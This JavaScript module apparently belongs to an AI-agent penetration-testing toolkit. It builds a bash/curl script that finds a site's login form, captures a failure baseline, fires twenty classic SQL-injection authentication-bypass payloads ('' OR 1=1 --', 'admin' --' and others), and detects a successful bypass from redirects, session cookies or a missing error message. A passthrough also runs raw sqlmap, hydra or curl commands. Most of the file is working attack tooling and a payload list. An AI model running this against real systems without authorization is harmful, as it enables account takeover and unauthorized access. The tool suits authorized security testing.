// PHASE 12 — SQL-injection authentication (login) bypass tester.
//
// Powers the ```loginbypass agent tag. Where `webinput` only spots a SQL *error* from a single quote and
// `exploit`/sqlmap dumps a DB, this tool does the specific, high-impact thing an attacker does at a login
// form: submit classic SQLi auth-bypass payloads and DETECT whether authentication was actually bypassed.
//   1. Auto-discovers the login form on the page (action URL, the username/email field, the password
//      field, and any hidden CSRF token), or accepts explicit `user=` / `pass=` field overrides.
//   2. Captures a FAILURE BASELINE by submitting junk credentials (status, length, redirect Location,
//      whether a session cookie is set, and the "invalid/incorrect/…" failure marker in the body).
//   3. Submits ~20 curated bypass payloads (the classic set: ' OR 1=1 --, admin' --, ' OR '1'='1, …) in
//      BOTH fields via --data-urlencode (safe for quotes/#/--), reusing a cookie jar + CSRF token.
//   4. Flags a BYPASS (critical) when a payload response diverges from the failure baseline in an
//      auth-meaningful way: redirect to a different (non-login) page, a NEW session cookie, or the failure
//      marker disappearing together with a real content change.
// Emits LOGINBYPASS<TAB>sev<TAB>payload<TAB>evidence<TAB>url (+ LBFORM/LBBASE/LBTRY diagnostics).
// finding_type 'auth-bypass'. Actively attempts to bypass authentication -> AUTHORIZATION-GATED.

import { normSev, dedupCap } from '../appsec/engine.js';

function urlOf(t) {
  const s = String(t || '').trim();
  const u = /^https?:\/\//i.test(s) ? s : 'https://' + s.replace(/^[a-z]+:\/\//i, '');
  return u.replace(/[^\w.\-:/?=&%#~+]/g, '');
}

// The classic SQLi login-bypass set (image list + a few battle-tested extras). label = short technique.
export const BYPASS_PAYLOADS = [
  ["' OR 1=1 --", 'The King — standard bypass for most DBs'],
  ["' OR 1=1 #", 'MySQL classic — # comment'],
  ["' OR 1=1 /*", 'Multi-line — C-style comment start'],
  ["admin' --", 'User spoof — log in as admin, ignore password'],
  ["admin' #", 'User spoof — MySQL comment'],
  ["' OR '1'='1", 'String logic — comparing 1 to 1'],
  ['" OR "1"="1', 'Double quotes — for "-delimited backends'],
  ["' OR TRUE --", 'Boolean — TRUE keyword'],
  ["') OR ('1'='1", 'Parenthesis (1) — closes a bracketed query'],
  ["')) OR (('1'='1", 'Parenthesis (2) — closes a double-bracket query'],
  ["admin' OR '1'='1", 'Hybrid — admin OR forces true'],
  ["' OR '' = '", 'Empty string — tricky logic'],
  ["1' OR '1'='1", 'Integer start — input begins as integer'],
  ["' OR 1=1 LIMIT 1 --", 'Limit — avoid multi-row errors'],
  ["' OR 1=1 -- -", 'Postgres-safe — extra dash fixes comment'],
  ['admin" --', 'Double-quote user — username in "…"'],
  ["admin') #", 'Closed group — closes user field + comments rest'],
  ["' OR 1=1--", 'No-space variant'],
  ['") OR ("1"="1', 'Double-quote parenthesis'],
  ["admin'-- -", 'Admin spoof, Postgres-safe comment'],
];

const FAIL_MARKERS = 'invalid|incorrect|wrong|failed|failure|denied|not found|try again|bad cred|authentication failed|login error|does not match|unrecognized|unauthori';
const SESSION_COOKIE = 'sess|sid|token|auth|jwt|phpsessid|jsessionid|connect\\.sid|asp\\.net_sessionid|laravel_session|_session';

export function buildLoginBypassScan(target, { userField = '', passField = '' } = {}) {
  const url = urlOf(target);
  const payloadHeredoc = BYPASS_PAYLOADS.map(([p]) => p).join('\n');
  const lines = [
    `URL="${url}"; UF="${userField}"; PF="${passField}";`,
    `emit(){ printf 'LOGINBYPASS\\t%s\\t%s\\t%s\\t%s\\n' "$1" "$2" "$3" "$4"; };`,
    `JAR=$(mktemp); PG=$(mktemp);`,
    `echo "== SQLi login-bypass test: $URL =="`,
    `echo "LBSCAN-BEGIN $URL";`,
    // fetch the login page (save cookies for CSRF/session continuity)
    `curl -s -k -L -m 15 -c "$JAR" -o "$PG" "$URL" 2>/dev/null;`,
    // ---- discover form action ----
    `ORIGIN=$(printf '%s' "$URL" | grep -oiE '^https?://[^/]+');`,
    `action=$(grep -oiE '<form[^>]*action=["'\\''][^"'\\'' >]*' "$PG" | head -1 | sed -E 's/.*action=["'\\'']//I');`,
    `case "$action" in`,
    `  '' ) POSTURL="$URL";;`,
    `  http*) POSTURL="$action";;`,
    `  /*) POSTURL="$ORIGIN$action";;`,
    `  *) POSTURL="\${URL%/*}/$action";;`,
    `esac;`,
    // ---- discover fields (unless overridden) ----
    `if [ -z "$PF" ]; then PF=$(grep -oiE '<input[^>]*type=["'\\'']?password[^>]*>' "$PG" | grep -oiE 'name=["'\\'']?[A-Za-z0-9_.:\\[\\]-]+' | head -1 | sed -E 's/name=["'\\'']?//I'); fi;`,
    `[ -z "$PF" ] && PF=password;`,
    `if [ -z "$UF" ]; then UF=$(grep -oiE '<input[^>]*name=["'\\'']?[A-Za-z0-9_.:\\[\\]-]+[^>]*>' "$PG" | grep -viE 'type=["'\\'']?(password|hidden|submit|checkbox|radio|button|file)' | grep -oiE 'name=["'\\'']?[A-Za-z0-9_.:\\[\\]-]+' | sed -E 's/name=["'\\'']?//I' | grep -iE 'user|email|login|uname|account|^name$|^id$|nick' | head -1); fi;`,
    `if [ -z "$UF" ]; then UF=$(grep -oiE '<input[^>]*type=["'\\'']?(text|email)[^>]*>' "$PG" | grep -oiE 'name=["'\\'']?[A-Za-z0-9_.:\\[\\]-]+' | head -1 | sed -E 's/name=["'\\'']?//I'); fi;`,
    `[ -z "$UF" ] && UF=username;`,
    // ---- hidden fields (CSRF tokens etc.) -> curl arg array ----
    `declare -a HID; while IFS= read -r inp; do`,
    `  n=$(printf '%s' "$inp" | grep -oiE 'name=["'\\'']?[A-Za-z0-9_.:\\[\\]-]+' | head -1 | sed -E 's/name=["'\\'']?//I');`,
    `  v=$(printf '%s' "$inp" | grep -oiE 'value=["'\\''][^"'\\'']*' | head -1 | sed -E 's/value=["'\\'']//I');`,
    `  [ -n "$n" ] && HID+=(--data-urlencode "$n=$v");`,
    `done < <(grep -oiE '<input[^>]*type=["'\\'']?hidden[^>]*>' "$PG");`,
    `printf 'LBFORM\\t%s\\t%s\\t%s\\n' "$POSTURL" "$UF" "$PF";`,
    // ---- request helper: prints "code<TAB>len<TAB>loc<TAB>cookie<TAB>fail" ----
    `req(){ local u="$1" p="$2"; local H B; H=$(mktemp); B=$(mktemp);`,
    `  code=$(curl -s -k -L -m 12 -b "$JAR" -c "$JAR" -D "$H" -o "$B" -w '%{http_code}' \\`,
    `    "\${HID[@]}" --data-urlencode "$UF=$u" --data-urlencode "$PF=$p" "$POSTURL" 2>/dev/null);`,
    `  len=$(wc -c < "$B" | tr -d ' ');`,
    `  loc=$(grep -iE '^location:' "$H" | tail -1 | tr -d '\\r' | sed -E 's/^[Ll]ocation:\\s*//');`,
    `  cook=0; grep -iE '^set-cookie:' "$H" | grep -qiE '${SESSION_COOKIE}' && cook=1;`,
    `  fail=0; grep -qiE '${FAIL_MARKERS}' "$B" && fail=1;`,
    `  printf '%s\\t%s\\t%s\\t%s\\t%s' "$code" "$len" "$loc" "$cook" "$fail"; rm -f "$H" "$B"; };`,
    // ---- baseline: junk creds ----
    `BASE=$(req 'zqx_nouser_9137' 'zqx_nopass_9137');`,
    `BC=$(printf '%s' "$BASE" | cut -f1); BL=$(printf '%s' "$BASE" | cut -f2); BLOC=$(printf '%s' "$BASE" | cut -f3); BCOOK=$(printf '%s' "$BASE" | cut -f4); BFAIL=$(printf '%s' "$BASE" | cut -f5);`,
    `printf 'LBBASE\\t%s\\t%s\\t%s\\t%s\\t%s\\n' "$BC" "$BL" "$BLOC" "$BCOOK" "$BFAIL";`,
    // ---- try each payload ----
    `while IFS= read -r PAY; do`,
    `  [ -z "$PAY" ] && continue;`,
    `  R=$(req "$PAY" "$PAY");`,
    `  PC=$(printf '%s' "$R" | cut -f1); PL=$(printf '%s' "$R" | cut -f2); PLOC=$(printf '%s' "$R" | cut -f3); PCOOK=$(printf '%s' "$R" | cut -f4); PFAIL=$(printf '%s' "$R" | cut -f5);`,
    `  printf 'LBTRY\\t%s\\t%s\\t%s\\t%s\\t%s\\n' "$PAY" "$PC" "$PL" "$PLOC" "$PFAIL";`,
    `  hit=0; why="";`,
    // signal 1: redirect to a different, non-login/non-error location
    `  if [ -n "$PLOC" ] && [ "$PLOC" != "$BLOC" ]; then`,
    `    printf '%s' "$PLOC" | grep -qiE 'login|signin|sign-in|auth|error|fail|invalid' || { hit=1; why="redirected to $PLOC (baseline: \${BLOC:-none})"; };`,
    `  fi;`,
    // signal 2: a session cookie now set that the baseline did not get
    `  if [ "$hit" = 0 ] && [ "$PCOOK" = 1 ] && [ "$BCOOK" = 0 ]; then hit=1; why="session cookie established (none for junk creds)"; fi;`,
    // signal 3: failure marker present for junk creds but GONE for the payload, with a real content change
    `  if [ "$hit" = 0 ] && [ "$BFAIL" = 1 ] && [ "$PFAIL" = 0 ]; then`,
    `    d=$(( PL - BL )); [ "$d" -lt 0 ] && d=$(( -d ));`,
    `    [ "$d" -gt 40 ] && { hit=1; why="failure message gone + body changed by \${d}B (junk creds still show it)"; };`,
    `  fi;`,
    `  if [ "$hit" = 1 ]; then emit critical "$PAY" "$why" "$POSTURL"; fi;`,
    `done <<'PAYLOADS'`,
    payloadHeredoc,
    `PAYLOADS`,
    `rm -f "$JAR" "$PG";`,
    `echo "LBSCAN-END";`,
  ];
  return lines.join('\n');
}

export function buildLoginBypassCommand(body) {
  const raw = String(body || '').trim();
  if (!raw) return null;
  if (/^(sqlmap|hydra|curl|ghauri)\b/i.test(raw)) return raw; // passthrough
  const tokens = raw.split(/\s+/);
  let userField = '', passField = '';
  const rest = [];
  for (const t of tokens) {
    const mu = /^user=(.+)$/i.exec(t); if (mu) { userField = mu[1]; continue; }
    const mp = /^pass=(.+)$/i.exec(t); if (mp) { passField = mp[1]; continue; }
    rest.push(t);
  }
  const target = rest.find((t) => /^https?:\/\//i.test(t) || /\./.test(t)) || rest[0];
  if (!target) return null;
  return buildLoginBypassScan(target, { userField, passField });
}

export function parseLoginBypassReport(output) {
  const text = String(output || '');
  const findings = [];
  const tries = [];
  let form = null, base = null;
  const seen = new Set();
  for (const line of text.split('\n')) {
    if (line.startsWith('LOGINBYPASS\t')) {
      const [, sev, payload, evidence, url] = line.split('\t');
      if (!payload || seen.has(payload)) continue;
      seen.add(payload);
      const note = (BYPASS_PAYLOADS.find(([p]) => p === payload) || [, ''])[1];
      findings.push({
        finding_type: 'auth-bypass',
        severity: normSev(sev || 'critical'),
        title: `SQL injection authentication bypass — login succeeded with payload: ${payload}`,
        host: (url || '').slice(0, 200) || null,
        evidence: `${evidence || ''}${note ? ` (${note})` : ''}`.slice(0, 240),
        cve: 'CWE-89',
        remediation: 'Use parameterised queries / prepared statements for the login lookup (never concatenate the username/password into SQL). Add server-side auth (hash+verify), a WAF, and rate limiting. Treat this as CRITICAL — anyone can log in as any user, including admin.',
        source: 'loginbypass',
      });
    } else if (line.startsWith('LBFORM\t')) {
      const [, action, uf, pf] = line.split('\t'); form = { action, uf, pf };
    } else if (line.startsWith('LBBASE\t')) {
      const [, code, len, loc, cook, fail] = line.split('\t'); base = { code, len, loc, cook, fail };
    } else if (line.startsWith('LBTRY\t')) {
      const [, payload, code, len, loc, fail] = line.split('\t'); tries.push({ payload, code, len, loc, fail });
    }
  }
  return { findings, tries, form, base };
}

export function extractLoginBypassFindings(command, output) {
  if (!/LOGINBYPASS\t/.test(String(output || ''))) return [];
  return dedupCap(parseLoginBypassReport(output).findings, 30);
}

export function renderLoginBypass(output) {
  const { findings, tries, form } = parseLoginBypassReport(output);
  if (!/LBSCAN-BEGIN/.test(String(output || ''))) return String(output || '').slice(0, 2000);
  const parts = [];
  if (form) parts.push(`**🔎 Target login form:** \`${form.action}\` — user field \`${form.uf}\`, password field \`${form.pf}\``);
  if (findings.length) {
    parts.push('**🚨 CRITICAL — SQL injection login bypass CONFIRMED:**\n' + findings.map((f) => {
      const pay = f.title.replace(/^.*payload: /, '');
      return `- Payload \`${pay}\` bypassed authentication\n  ↳ ${f.evidence}`;
    }).join('\n'));
    parts.push('**Fix:** ' + findings[0].remediation);
  } else {
    const n = tries.length;
    parts.push(`_No SQLi authentication bypass detected — tried ${n} classic payload${n === 1 ? '' : 's'}; none produced an authenticated response (login appears to use parameterised queries or a non-SQL auth path)._`);
  }
  return parts.join('\n\n');
}
